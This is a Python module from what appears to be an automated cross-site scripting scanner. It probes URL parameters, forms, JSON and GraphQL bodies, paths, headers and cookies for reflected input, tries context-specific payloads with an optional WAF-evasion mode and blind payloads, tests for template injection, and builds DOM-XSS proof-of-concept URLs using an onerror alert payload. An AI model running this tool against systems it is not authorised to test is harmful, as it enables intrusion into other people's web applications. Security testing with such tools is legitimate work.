from __future__ import annotations

import concurrent.futures as cf
import threading
from urllib.parse import quote, urljoin, urlsplit

from . import crlf as crlf_mod
from . import detect, params, payloads, waf

DOM_HASH_SOURCES = ("location.hash", "location.href", "document.url",
                    "document.documenturi")


def _contexts_from(refs):
    out = []
    for r in refs:
        c = r["context"]
        if c != "none" and c not in out:
            out.append(c)
    return out


def _finding(method, url, param, refs, char_map, working, status, body, mk):
    best = refs[0]["context"] if refs else "none"
    if best == "json_reflection":
        severity = "medium"
    elif best == "encoded":
        severity = "low"
    else:
        severity = "high"
    return {
        "url": url,
        "param": param,
        "method": method,
        "context": best,
        "contexts": _contexts_from(refs),
        "char_map": "".join(c for c, ok in char_map.items() if ok),
        "status": status,
        "payload": (working[0] if working else payloads.CONTEXT_PAYLOAD.get(best)),
        "working_payloads": working[:20],
        "evidence": detect.evidence(body, mk),
        "severity": severity,
        "how": "raw-injection" if working else "reflected-context",
        "verified": False,
    }


def _probe_payloads(client, send, payloads_list, contexts, char_map, evade):
    working = []
    tried = set()
    if not payloads_list:
        return working
    for ctx in contexts:
        for p in payloads.for_context(ctx, payloads_list, char_map=char_map, evade=evade):
            if p in tried:
                continue
            tried.add(p)
            pr = send(p)
            if pr is None or waf.blocked(pr):
                continue
            try:
                body = pr.text
            except Exception:
                continue
            if detect.payload_lands(body, p, ctx):
                working.append(p)
            if len(working) >= 20:
                return working
    return working


def scan_url(client, url, payloads_list=None, blind=None, evade=False):
    findings = []
    blind_sent = []
    for name in params.injectable(url):
        mk = payloads.marker()
        probe = detect.probe_value(mk)
        try:
            resp = client.get(params.set_param(url, name, probe))
        except Exception:
            continue
        if waf.blocked(resp):
            continue
        ct = resp.headers.get("Content-Type", "")
        refs = detect.reflections(resp.text, mk, ct)
        char_map = detect.char_survival(resp.text, mk)
        confirmed_any = any(r["confirmed"] for r in refs)
        contexts = _contexts_from(refs)

        def send(p, _n=name):
            try:
                return client.get(params.set_param(url, _n, p))
            except Exception:
                return None

        working = []
        if refs:
            working = _probe_payloads(client, send, payloads_list, contexts, char_map, evade)
        if confirmed_any or working:
            findings.append(_finding("GET", url, name, refs, char_map, working,
                                     resp.status_code, resp.text, mk))
        if blind:
            try:
                client.get(params.set_param(url, name, blind))
                blind_sent.append({"url": url, "param": name})
            except Exception:
                pass
    return findings, blind_sent


def scan_form(client, action, fields, payloads_list=None, blind=None, evade=False,
              json_body=False, multipart=False):
    findings = []
    blind_sent = []
    for name in fields:
        mk = payloads.marker()
        probe = detect.probe_value(mk)

        def send(p, _n=name):
            payload_body = {f: (p if f == _n else "1") for f in fields}
            try:
                if json_body:
                    return client.post_json(action, payload_body)
                return client.post(action, payload_body, multipart=multipart)
            except Exception:
                return None

        resp = send(probe)
        if resp is None or waf.blocked(resp):
            continue
        ct = resp.headers.get("Content-Type", "")
        try:
            rbody = resp.text
        except Exception:
            continue
        refs = detect.reflections(rbody, mk, ct)
        char_map = detect.char_survival(rbody, mk)
        confirmed_any = any(r["confirmed"] for r in refs)
        contexts = _contexts_from(refs)
        working = []
        if refs:
            working = _probe_payloads(client, send, payloads_list, contexts, char_map, evade)
        if confirmed_any or working:
            method = "POST-JSON" if json_body else "POST"
            findings.append(_finding(method, action, name, refs, char_map, working,
                                     resp.status_code, rbody, mk))
        if blind:
            send(blind)
            blind_sent.append({"url": action, "param": name,
                               "method": "POST-JSON" if json_body else "POST"})
    return findings, blind_sent


REFLECT_HEADERS = ("Referer", "User-Agent", "X-Forwarded-For", "X-Forwarded-Host",
                   "Origin", "True-Client-IP", "X-Real-IP", "X-Api-Version",
                   "From", "X-Wap-Profile")


def _header_probe_value(hname, probe):
    low = hname.lower()
    if low in ("referer", "origin", "x-forwarded-host"):
        return "https://xpars.example/" + probe
    if "ip" in low or "forwarded-for" in low:
        return "127.0.0.1, " + probe
    return probe


def scan_headers(client, url, payloads_list=None, evade=False, cookie_probe=True):
    findings = []
    for hname in REFLECT_HEADERS:
        mk = payloads.marker()
        probe = detect.probe_value(mk)

        def send(p, _h=hname):
            try:
                return client.get(url, headers={_h: _header_probe_value(_h, p)})
            except Exception:
                return None

        resp = send(probe)
        if resp is None or waf.blocked(resp):
            continue
        try:
            rbody = resp.text
        except Exception:
            continue
        refs = detect.reflections(rbody, mk, resp.headers.get("Content-Type", ""))
        if not refs:
            continue
        char_map = detect.char_survival(rbody, mk)
        contexts = _contexts_from(refs)
        confirmed_any = any(r["confirmed"] for r in refs)
        working = _probe_payloads(client, send, payloads_list, contexts, char_map, evade)
        if confirmed_any or working:
            findings.append(_finding("HEADER", url, hname, refs, char_map, working,
                                     resp.status_code, rbody, mk))
    if cookie_probe:
        mk = payloads.marker()
        probe = detect.probe_value(mk)

        def csend(p):
            try:
                return client.get(url, headers={"Cookie": "xpars=" + p})
            except Exception:
                return None

        resp = csend(probe)
        if resp is not None and not waf.blocked(resp):
            try:
                rbody = resp.text
            except Exception:
                rbody = ""
            refs = detect.reflections(rbody, mk, resp.headers.get("Content-Type", ""))
            if refs:
                char_map = detect.char_survival(rbody, mk)
                contexts = _contexts_from(refs)
                confirmed_any = any(r["confirmed"] for r in refs)
                working = _probe_payloads(client, csend, payloads_list, contexts, char_map, evade)
                if confirmed_any or working:
                    findings.append(_finding("COOKIE", url, "Cookie:xpars", refs,
                                             char_map, working, resp.status_code, rbody, mk))
    return findings


def scan_json_template(client, action, template, payloads_list=None, evade=False):
    from . import jsontpl
    findings = []
    for path in jsontpl.leaves(template):
        mk = payloads.marker()
        probe = detect.probe_value(mk)

        def send(p, _pp=path):
            try:
                return client.post_json(action, jsontpl.set_at(template, _pp, p))
            except Exception:
                return None

        resp = send(probe)
        if resp is None or waf.blocked(resp):
            continue
        try:
            rbody = resp.text
        except Exception:
            continue
        ct = resp.headers.get("Content-Type", "")
        refs = detect.reflections(rbody, mk, ct)
        char_map = detect.char_survival(rbody, mk)
        confirmed_any = any(r["confirmed"] for r in refs)
        contexts = _contexts_from(refs)
        working = []
        if refs:
            working = _probe_payloads(client, send, payloads_list, contexts, char_map, evade)
        if confirmed_any or working:
            pname = ".".join(str(k) for k in path) or "(root)"
            f = _finding("POST-JSON", action, pname, refs, char_map, working,
                         resp.status_code, rbody, mk)
            f["json_template"] = template
            f["json_path"] = list(path)
            findings.append(f)
    return findings, []


def scan_path(client, url, payloads_list=None, evade=False):
    findings = []
    for idx, seg in params.path_segments(url):
        mk = payloads.marker()
        probe = mk + "<>'\"();{}="

        def send(p, _i=idx):
            try:
                return client.get(params.set_path_segment(url, _i, quote(p, safe="")))
            except Exception:
                return None

        resp = send(probe)
        if resp is None or waf.blocked(resp):
            continue
        try:
            body = resp.text
        except Exception:
            continue
        refs = detect.reflections(body, mk, resp.headers.get("Content-Type", ""))
        if not refs:
            continue
        char_map = detect.char_survival(body, mk)
        contexts = _contexts_from(refs)
        confirmed_any = any(r["confirmed"] for r in refs)
        working = _probe_payloads(client, send, payloads_list, contexts, char_map, evade)
        if confirmed_any or working:
            f = _finding("PATH", url, "path[%d]:%s" % (idx, seg), refs, char_map,
                         working, resp.status_code, body, mk)
            f["path_index"] = idx
            findings.append(f)
    return findings


GRAPHQL_JSON_CONTEXTS = ("json_reflection", "encoded")


def scan_graphql(client, action, query, variables=None, payloads_list=None, evade=False):
    from . import jsontpl
    variables = variables if variables is not None else {}
    template = {"query": query, "variables": variables}
    leaves = [p for p in jsontpl.leaves(template) if p and p[0] == "variables"]
    if not leaves:
        leaves = [("query",)]
    findings = []
    for path in leaves:
        mk = payloads.marker()
        probe = detect.probe_value(mk)

        def send(p, _pp=path):
            try:
                return client.post_json(action, jsontpl.set_at(template, _pp, p))
            except Exception:
                return None

        resp = send(probe)
        if resp is None or waf.blocked(resp):
            continue
        try:
            rbody = resp.text
        except Exception:
            continue
        ct = resp.headers.get("Content-Type", "")
        refs = detect.reflections(rbody, mk, ct)
        if not refs:
            continue
        char_map = detect.char_survival(rbody, mk)
        confirmed_any = any(r["confirmed"] for r in refs)
        contexts = _contexts_from(refs)
        working = _probe_payloads(client, send, payloads_list, contexts, char_map, evade)
        if confirmed_any or working:
            pname = ".".join(str(k) for k in path)
            f = _finding("GRAPHQL", action, pname, refs, char_map, working,
                         resp.status_code, rbody, mk)
            f["json_template"] = template
            f["json_path"] = list(path)
            if f["context"] in GRAPHQL_JSON_CONTEXTS:
                f["severity"] = "medium"
                f["how"] = "reflected-json"
            findings.append(f)
    return findings, []


CSTI_PROBES = (("{{1337*1337}}", "1787569"), ("${1331*1333}", "1774223"))


def scan_csti(client, url):
    findings = []
    for name in params.injectable(url):
        mk = payloads.marker()
        for expr, res in CSTI_PROBES:
            val = mk + expr
            try:
                resp = client.get(params.set_param(url, name, val))
            except Exception:
                continue
            if waf.blocked(resp):
                continue
            try:
                body = resp.text
            except Exception:
                continue
            if (mk + res) in body and (mk + expr) not in body:
                findings.append({
                    "url": url, "param": name, "method": "CSTI-GET",
                    "context": "template", "contexts": ["template"],
                    "char_map": "", "status": resp.status_code,
                    "payload": expr, "working_payloads": [],
                    "evidence": detect.evidence(body, mk + res),
                    "severity": "high", "how": "template-eval",
                    "verified": False,
                })
                break
    return findings


def _dom_pass(client, urls):
    out = []
    seen_pages = set()
    seen_js = set()
    for u in urls:
        parts = urlsplit(u)
        key = (parts.hostname, parts.path)
        if key in seen_pages:
            continue
        seen_pages.add(key)
        try:
            mbody = client.get(u).text
        except Exception:
            continue
        hits = detect.dom_findings(mbody)
        for src in detect.script_srcs(mbody)[:12]:
            jsurl = urljoin(u, src)
            if urlsplit(jsurl).hostname != parts.hostname:
                continue
            if jsurl in seen_js:
                continue
            seen_js.add(jsurl)
            try:
                js = client.get(jsurl).text
            except Exception:
                continue
            for h in detect.dom_findings_js(js):
                h = dict(h)
                h["script"] = jsurl
                hits.append(h)
        for h in hits:
            h = dict(h)
            h["url"] = u
            h["verified"] = False
            if any(s in DOM_HASH_SOURCES for s in h.get("sources", [])):
                pay = "<img src=x onerror=alert(1)>"
                h["payload"] = pay
                h["poc"] = u.split("#")[0] + "#" + pay
                h["severity"] = "high"
            else:
                h["severity"] = "medium"
            out.append(h)
    return out


def _host(url):
    return (urlsplit(url).hostname or "").lower()


def dedup_findings(findings):
    out = []
    seen = {}
    for f in findings:
        key = (f.get("method"), f["url"], f["param"], f["context"])
        if key in seen:
            ex = seen[key]
            merged = list(ex.get("working_payloads", []))
            for p in f.get("working_payloads", []):
                if p not in merged:
                    merged.append(p)
            ex["working_payloads"] = merged[:20]
            continue
        seen[key] = f
        out.append(f)
    return out


def scan(client, urls, threads=8, payloads_list=None, blind=None, post_forms=None,
         crlf=False, stop_on_confirm=False, evade=False, header_scan=False,
         json_forms=None, path_scan=False, multipart=False, json_templates=None,
         csti=False, graphql=None, dom_urls=None):
    result = {"findings": [], "dom": [], "blind_sent": []}
    confirmed = set()
    lock = threading.Lock()

    def run_get(u):
        if stop_on_confirm:
            with lock:
                if _host(u) in confirmed:
                    return [], []
        finds, blind_sent = scan_url(client, u, payloads_list, blind, evade)
        if crlf:
            finds = finds + crlf_mod.scan_crlf(client, u)
        if path_scan:
            finds = finds + scan_path(client, u, payloads_list, evade)
        if header_scan:
            finds = finds + scan_headers(client, u, payloads_list, evade)
        if csti:
            finds = finds + scan_csti(client, u)
        if stop_on_confirm and finds:
            with lock:
                confirmed.add(_host(u))
        return finds, blind_sent

    jobs = []
    for u in urls:
        jobs.append(("GET", u))
    for form in post_forms or []:
        jobs.append(("POST", form))
    for form in json_forms or []:
        jobs.append(("JSON", form))
    for form in json_templates or []:
        jobs.append(("JSONT", form))
    if graphql:
        jobs.append(("GQL", graphql))
    with cf.ThreadPoolExecutor(max_workers=max(1, threads)) as pool:
        futures = {}
        for kind, item in jobs:
            if kind == "GET":
                futures[pool.submit(run_get, item)] = ("GET", item)
            elif kind == "JSONT":
                futures[pool.submit(scan_json_template, client, item["action"],
                                    item["template"], payloads_list, evade)] = ("JSONT", item)
            elif kind == "GQL":
                futures[pool.submit(scan_graphql, client, item["url"], item["query"],
                                    item.get("variables"), payloads_list, evade)] = ("GQL", item)
            elif kind == "JSON":
                futures[pool.submit(scan_form, client, item["action"],
                                    item["fields"], payloads_list, blind, evade,
                                    True, False)] = ("JSON", item)
            else:
                futures[pool.submit(scan_form, client, item["action"],
                                    item["fields"], payloads_list, blind, evade,
                                    False, multipart)] = ("POST", item)
        for fut in cf.as_completed(futures):
            try:
                finds, blind_sent = fut.result()
            except Exception:
                continue
            result["findings"].extend(finds)
            result["blind_sent"].extend(blind_sent)
    result["dom"] = _dom_pass(client, dom_urls if dom_urls is not None else list(urls))
    result["findings"] = dedup_findings(result["findings"])
    return result
